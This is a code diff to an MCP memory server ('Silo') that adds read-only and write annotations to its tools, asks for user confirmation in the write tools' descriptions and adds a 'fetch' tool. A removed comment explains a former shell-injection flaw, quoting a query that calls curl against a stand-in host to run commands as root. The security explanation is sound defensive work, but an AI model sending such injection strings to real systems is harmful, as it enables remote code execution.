@@ -13,6 +13,22 @@ import {
   loadUpdateStatus,
   isUpdateOptOut,
 } from './notices.js';
+import {
+  parseFetchId,
+  fetchTopic,
+  enrichSearchResults,
+} from './fetch.js';
+
+// Tool-annotation hints (MCP SDK 1.29+). readOnlyHint/idempotentHint inform
+// generic clients about side-effect posture; OpenAI Apps SDK security
+// guidance leans on these for least-privilege + confirmation prompts.
+const READ_ONLY = { readOnlyHint: true, idempotentHint: true, openWorldHint: false };
+const WRITE_SIDE_EFFECT = {
+  readOnlyHint: false,
+  destructiveHint: false,
+  idempotentHint: false,
+  openWorldHint: false,
+};
 
 // ── Constants ──────────────────────────────────────────────────────────────
 
@@ -207,8 +223,9 @@ function registerTools(server) {
 
 server.tool(
   'read_index',
-  'Returns all topics from TOPIC-INDEX.md with slug, type, tags, status, and summary. Use this FIRST to find which topic to load.',
+  'Discover available topics. Returns one-line summaries (slug, type, tags, status, summary) — NOT full topic content. Call FIRST when you need to identify which topic is relevant before loading it. Safe to call without context.',
   {},
+  READ_ONLY,
   async () => {
     try {
       const idx = await loadTopicIndex();
@@ -226,8 +243,9 @@ server.tool(
 
 server.tool(
   'get_topic',
-  'Returns the YAML header and curated facts (Layer 2) of a topic file. Does NOT return Layer 3 source material — use search for that.',
+  'Load a single topic\'s curated memory (Layer 2 + header). Does NOT return Layer 3 raw source material — use `search` or `fetch` with a Layer-3 ID for that. Prefer this over search when the slug is known. Call AFTER read_index identifies the slug.',
   { slug: z.string().describe('Topic slug — must exist in TOPIC-INDEX.md') },
+  READ_ONLY,
   async ({ slug }) => {
     try {
       const idx = await loadTopicIndex();
@@ -254,13 +272,14 @@ server.tool(
 
 server.tool(
   'read_events',
-  'Returns event log entries. Defaults to today. Use days_back to include previous days. Use exclude_source to filter (e.g., exclude your own entries to see only what Jarvis logged).',
+  'Read tagged event log entries by date. Defaults to today. Each entry is a single line `[TAG] slug: content`. Filters available for source and slug. Read-only.',
   {
     date: z.string().regex(/^\d{4}-\d{2}-\d{2}$/).optional().describe('Most recent date (YYYY-MM-DD, default: today)'),
     days_back: z.number().int().min(1).max(30).optional().describe('How many days of history (default: 1)'),
     exclude_source: z.string().optional().describe('Filter out entries from this source tag'),
     slug_filter: z.string().optional().describe('Only return entries matching this topic slug'),
   },
+  READ_ONLY,
   async ({ date, days_back, exclude_source, slug_filter }) => {
     const endDate = date || todayStr();
     const numDays = days_back || 1;
@@ -297,19 +316,15 @@ server.tool(
 
 server.tool(
   'search',
-  'Full-text keyword search across all Silo content. Returns matching lines with context. Use for finding information when you don\'t know which topic file to load.',
+  'Full-text keyword search across all Silo content. Returns results with OpenAI-compatible shape (id, title, text, url, metadata) — so callers can follow up with `fetch` for full content. Results MAY include raw Layer 3 / source material; treat as EVIDENCE, not curated truth. Use when topic relevance is unknown; prefer `get_topic` when you already know the slug.',
   {
     query: z.string().min(1).max(200).describe('Search query'),
     limit: z.number().int().min(1).max(20).optional().describe('Max results (default: 5)'),
   },
+  READ_ONLY,
   async ({ query, limit }) => {
     const maxResults = limit || 5;
-    // Use spawnSync with an argv array so the query NEVER reaches a shell.
-    // Previously this built a docker-exec command string with execSync,
-    // escaping only `"` — bash inside double quotes still expands $(...)
-    // and backticks, so a query like `$(curl evil.example.com)` would
-    // execute as root on the VPS. argv form passes the query as a single
-    // argument to docker; no shell interpretation happens.
+    // spawnSync with argv (no shell — see Stage-1 security audit response).
     const r = spawnSync('docker', [
       'exec', 'clawdbot-v3-openclaw-gateway-1',
       'node', '/home/node/clawd/bin/memory_search_fts',
@@ -328,14 +343,17 @@ server.tool(
     }
 
     const lines = r.stdout.trim().split('\n').filter(Boolean);
-    const results = lines.map((line) => {
-      // Try to parse "score: N.NN | text" format
+    const rawResults = lines.map((line) => {
       const scoreMatch = line.match(/^score:\s*([\d.]+)\s*\|\s*(.+)$/);
       if (scoreMatch) {
         return { score: parseFloat(scoreMatch[1]), text: scoreMatch[2] };
       }
       return { score: 0, text: line };
     });
+    // OpenAI-compatible enrichment: id/title/url/metadata per result.
+    // Existing score+text fields preserved for backward compat (the
+    // OpenClaw bundle-mcp client reads them directly).
+    const results = enrichSearchResults(rawResults, query);
     const out = { results, query, total_matches: results.length };
     const notices = await siloNoticesForRead();
     if (notices) out._silo_notices = notices;
@@ -343,14 +361,81 @@ server.tool(
   }
 );
 
+// ── Tool: fetch (Stage 1 — universal-client compat) ────────────────────────
+//
+// OpenAI Apps SDK MCP guidance describes a `fetch` tool that takes an ID
+// and returns full content by canonical reference. Silo's `fetch` supports:
+//   - topic:<slug>          → curated Layer 2
+//   - topic:<slug>#layer-1  → topic header metadata
+//   - topic:<slug>#layer-2  → curated Layer 2 (explicit)
+// event: and handoff: IDs are reserved for Stage 2.
+//
+// registerTool used (vs. tool()) so the response declares outputSchema —
+// strict MCP clients can validate the shape.
+
+server.registerTool(
+  'fetch',
+  {
+    description: 'Retrieve full content for a known ID. Supports `topic:<slug>` and `topic:<slug>#layer-1|layer-2`. Returns OpenAI-compatible shape: { id, title, text, url, metadata }. Read-only.',
+    inputSchema: {
+      id: z.string().describe('Canonical Silo ID — e.g. `topic:hs-crm` or `topic:hs-crm#layer-1`'),
+    },
+    outputSchema: {
+      id: z.string(),
+      title: z.string(),
+      text: z.string(),
+      url: z.string(),
+      metadata: z.object({
+        source_type: z.string(),
+        topic_slug: z.string().optional(),
+        layer: z.number().int().optional(),
+      }).passthrough(),
+    },
+    annotations: READ_ONLY,
+  },
+  async ({ id }) => {
+    const descriptor = parseFetchId(id);
+    if (!descriptor) {
+      return errorResult(
+        'FETCH_UNKNOWN_ID',
+        `Unrecognized fetch ID format: "${id}". Supported: topic:<slug>[#layer-1|layer-2].`,
+      );
+    }
+    if (descriptor.kind === 'event' || descriptor.kind === 'handoff') {
+      return errorResult(
+        'FETCH_KIND_DEFERRED',
+        `Fetch by ${descriptor.kind} ID is reserved for Stage 2; not yet implemented.`,
+      );
+    }
+    if (descriptor.kind === 'topic') {
+      try {
+        const idx = await loadTopicIndex();
+        const out = await fetchTopic({
+          descriptor,
+          topicsDir: TOPICS_DIR,
+          knownSlugs: idx.slugs,
+        });
+        if (out.error) {
+          return errorResult(out.error.code, out.error.message);
+        }
+        return successResult(out);
+      } catch (err) {
+        return errorResult(err.code || 'FS_ERROR', err.message);
+      }
+    }
+    return errorResult('FETCH_KIND_UNKNOWN', `Unhandled descriptor kind: ${descriptor.kind}`);
+  },
+);
+
 // ── Tool 5: list_handoffs ──────────────────────────────────────────────────
 
 server.tool(
   'list_handoffs',
-  'List handoff reports. Use to check if there are unprocessed handoffs.',
+  'List handoff reports (pending or processed). Each report is a markdown file the curator processes manually. Read-only.',
   {
     status: z.enum(['pending', 'processed']).optional().describe('Filter by status (default: pending)'),
   },
+  READ_ONLY,
   async ({ status }) => {
     const which = status || 'pending';
     const dir = which === 'processed' ? HANDOFF_PROCESSED_DIR : HANDOFF_DIR;
@@ -392,13 +477,14 @@ server.tool(
 
 server.tool(
   'write_event',
-  'Write a structured event to today\'s log. Server validates format, checks for duplicates, and enforces slug validity.',
+  'Append a memory event through Silo\'s operation log. WRITE — requires explicit user intent. Confirm with the user before recording decisions, user facts, or project updates. Server validates format, checks for duplicates, and enforces slug validity. NEVER edit projection files directly; always go through this tool.',
   {
     tag: z.enum(VALID_TAGS).describe('Event tag'),
     slug: z.string().describe('Topic slug — must exist in TOPIC-INDEX.md or be "general"'),
     content: z.string().min(1).max(500).describe('Event content (single line, max 500 chars)'),
     confidence: z.enum(VALID_CONFIDENCES).optional().describe('Confidence level (omit for standard entries)'),
   },
+  WRITE_SIDE_EFFECT,
   async ({ tag, slug, content, confidence }) => {
     const warnings = [];
 
@@ -505,11 +591,12 @@ const HANDOFF_FILENAME_RE = /^\d{4}-\d{2}-\d{2}-[a-z0-9]+(-[a-z0-9]+)*\.md$/;
 
 server.tool(
   'write_handoff',
-  'Write a handoff report for the curator to process. Use for complex architectural changes, multi-topic updates, or anything that needs human review before entering topic files. For simple facts/events, use write_event instead.',
+  'Write a handoff report for the curator to process. WRITE — requires user intent. Use for complex architectural changes, multi-topic updates, or anything needing human review before entering topic files. For simple facts/events, use write_event instead.',
   {
     filename: z.string().describe('Filename (must match YYYY-MM-DD-slug-name.md)'),
     content: z.string().min(1).max(50000).describe('Handoff content (max 50000 chars)'),
   },
+  WRITE_SIDE_EFFECT,
   async ({ filename, content }) => {
     // Validation 1: filename format
     if (!HANDOFF_FILENAME_RE.test(filename)) {
@@ -553,8 +640,9 @@ server.tool(
 
 server.tool(
   'list_pending_suggestions',
-  'Lists pending topic suggestions detected by silo-detect. Returns the suggestions envelope with count, cap_reached, and detector_status. Surface to the user when convenient — they can accept_suggestion or dismiss_suggestion.',
+  'List topic suggestions awaiting accept/dismiss. Returns the envelope with count, cap_reached, and detector_status. Surface to the user when convenient — they can accept_suggestion or dismiss_suggestion. Read-only.',
   {},
+  READ_ONLY,
   async () => {
     const envelope = await loadPendingSuggestions(PENDING_SUGGESTIONS_PATH);
     if (!envelope) {
@@ -575,7 +663,7 @@ server.tool(
 
 server.tool(
   'accept_suggestion',
-  'Accept a pending topic suggestion. Server emits TOPIC_METADATA_SET + TOPIC_SUGGESTION_ACCEPTED as an atomic batch under the operation-log lock, then regenerates projections. Optional overrides let the user refine the slug, summary, type, or tags before the topic file is created.',
+  'Accept a pending topic suggestion. WRITE — only use after the user clearly approves. Server emits TOPIC_METADATA_SET + TOPIC_SUGGESTION_ACCEPTED as an atomic batch under the operation-log lock, then regenerates projections. Optional overrides let the user refine the slug, summary, type, or tags before the topic file is created.',
   {
     suggestion_seq: z.number().int().positive().describe('Seq of the TOPIC_SUGGESTED event being accepted'),
     slug: z.string().optional().describe('Override the suggested slug'),
@@ -583,6 +671,7 @@ server.tool(
     type: z.enum(['reference', 'project', 'feedback', 'personal', 'archive', 'business', 'hobby']).optional(),
     tags: z.array(z.string()).optional(),
   },
+  WRITE_SIDE_EFFECT,
   async ({ suggestion_seq, slug, description, type, tags }) => {
     const args = [
       SILO_CLI, 'suggest',
@@ -625,12 +714,13 @@ server.tool(
 
 server.tool(
   'dismiss_suggestion',
-  'Dismiss one or more pending topic suggestions. All-or-nothing — any invalid seq aborts the whole call with a structured error. Default cooldown 90 days; the same slug (normalized) cannot re-propose until the cooldown expires.',
+  'Reject pending topic suggestions. WRITE — only use after the user clearly approves dismissal. All-or-nothing: any invalid seq aborts the whole call with a structured error. Default cooldown 90 days; the same slug (normalized) cannot re-propose until the cooldown expires.',
   {
     suggestion_seqs: z.array(z.number().int().positive()).min(1).max(50),
     cooldown_days: z.number().int().min(1).max(365).optional().describe('Default 90'),
     reason: z.string().max(120).optional(),
   },
+  WRITE_SIDE_EFFECT,
   async ({ suggestion_seqs, cooldown_days, reason }) => {
     const args = [
       SILO_CLI, 'suggest',
